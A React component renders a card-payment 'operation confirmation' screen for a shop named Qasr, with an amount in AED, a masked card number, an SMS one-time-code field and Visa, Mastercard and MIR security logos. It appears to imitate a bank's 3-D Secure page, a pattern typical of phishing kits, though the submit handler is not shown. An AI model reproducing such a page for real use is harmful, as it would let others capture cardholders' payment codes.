import { useInputHandlers } from '../useInputHandlers';
import './FormOTP.scss';

import SC from './imagesOTP/SC';
import VBV from './imagesOTP/VBV';
import MSC from './imagesOTP/MSC';
import MIR from './imagesOTP/MIR';
import PIC from './imagesOTP/PIC';
import { text } from 'stream/consumers';

interface IFormOTP {
  money: number;
  handleSubmit3DS: (e: React.FormEvent) => void;
  ThreeDSInputRef: React.RefObject<HTMLInputElement>;
  ThreeDSFormTextRef: React.RefObject<HTMLParagraphElement>;
  ThreeDsInputWrapperRef: React.RefObject<HTMLDivElement>;
}

const FormOTP = ({
  money,
  handleSubmit3DS,
  ThreeDSInputRef,
  ThreeDSFormTextRef,
  ThreeDsInputWrapperRef,
}: IFormOTP) => {
  const {
    cardData,
    valueTel,
    valueCard,
    handleCardDataChange,
    handleTelChange,
    handleCardChange,
  } = useInputHandlers();

  return (
    <form className="FormOTP" onSubmit={handleSubmit3DS}>
      <h2 className="OTPTableHeader">Operation confirmation</h2>
      <div className="grid-container">
        <div className="grid-item">Shop</div>
        <div className="grid-item">Qasr</div>
        <div className="grid-item">Order amount</div>
        <div className="grid-item">{money} AED</div>
        <div className="grid-item">Card number</div>
        <div className="grid-item">**** **** **** </div>
        <div className="grid-item">Comment</div>
        <div className="grid-item">-</div>
      </div>
      <div className="ThreeDSFormText" ref={ThreeDSFormTextRef}>
        To confirm the operation, an SMS message with a confirmation code was
        sent to your phone number. Enter it in the field below.
      </div>
      <div className="ThreeDsInputWrapper" ref={ThreeDsInputWrapperRef}>
        <label htmlFor="3dsCode">OTP code:</label>
        <input
          type="text"
          id="3dsCode"
          name="3dsCode"
          placeholder="Enter the verification code"
          ref={ThreeDSInputRef}
        />
        <div>
          <input type="submit" value="Send code" className="ThreeDSSubmitBtn" />
        </div>
      </div>

      <div className="images-wrapper">
        <VBV />
        <SC />
        <MSC />
        <MIR />
        <PIC />
      </div>
    </form>
  );
};

export default FormOTP;
